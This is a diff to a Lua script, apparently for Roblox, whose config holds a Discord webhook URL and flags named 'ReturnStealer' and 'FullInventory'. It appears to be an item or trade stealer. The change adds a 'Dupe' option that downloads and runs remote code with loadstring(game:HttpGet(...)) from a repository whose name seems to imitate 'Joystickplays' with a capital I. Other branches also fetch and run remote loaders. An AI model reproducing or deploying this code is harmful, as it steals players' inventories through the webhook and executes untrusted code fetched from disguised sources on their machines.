@@ -3,8 +3,8 @@ Config = {
     Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
     FullInventory = true,
     ReturnStealer = true,
-    Script = "Custom",
-    CustomLink = "https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"
+    Script = "Dupe",
+    CustomLink = ""
 }
 Commands = {ResendTrade = ".resend", RestartPlayer = ".restart"}
 repeat
@@ -425,6 +425,6 @@ elseif Config.Script == "R3TH PRIV" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
 elseif Config.Script == "AshbornnHub" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
-elseif Config.Script == "Yarhm" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+elseif Config.Script == "Dupe" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
 end
